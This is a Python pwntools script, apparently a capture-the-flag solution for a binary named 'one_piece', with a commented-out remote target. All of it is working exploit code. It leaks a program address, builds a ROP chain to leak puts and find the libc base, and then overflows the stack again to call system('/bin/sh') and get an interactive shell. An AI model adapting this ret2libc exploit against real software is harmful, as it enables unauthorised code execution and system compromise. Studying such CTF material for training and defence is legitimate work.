#!/usr/bin/python3
from pwn import *
import time

elf = context.binary = ELF('./one_piece')
context.log_level = 'INFO'
context.terminal = 'alacritty'

libpath = '~/Downloads/libc-2.32-1-x86_64'
libc = ELF(libpath + 'libc-2.30.so')
p = process(elf.path)
#p = remote('onepiece.fword.wtf', 1238)

p.recvuntil('>>')
p.sendline('read')
p.recvuntil('>>')
p.send('A' * 0x27 + 'z')
p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('amazing, right ? : ')

whatisthis = p.recvline().strip()
mugiwara = (int(whatisthis,16) & (2**64 - 0x1000)) + elf.sym.mugiwara

log.info('mugiwara: ' + hex(mugiwara))
elf.address = mugiwara - elf.sym.mugiwara
log.info('elf.address: ' + hex(elf.address))

# Wanna tell Luffy something?
p.recvline()
rop = ROP([elf])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
#payload += p64(pop_rdi)
#payload += p64(elf.got.printf)
#payload += p64(elf.plt.puts)
#payload += p64(pop_rdi)
#payload += p64(elf.got.read)
#payload += p64(elf.plt.puts)
payload += p64(elf.sym.choice)

p.sendline(payload)

puts = u64(p.recvline().strip() + b'\x00\x00')
libc.address = puts - libc.sym.puts

log.info(f'{puts=:x} ')
log.info(f'{libc.address=:x} ')

system_offset = 0x4a82f
libc_system = libc.address + system_offset
str_bin_sh = libc.address + 0x18de78

log.info(f'{libc_system=:x} ')

p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('amazing, right ? : ')

payload = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(str_bin_sh)
payload += p64(libc_system)

p.sendline(payload)

p.interactive()


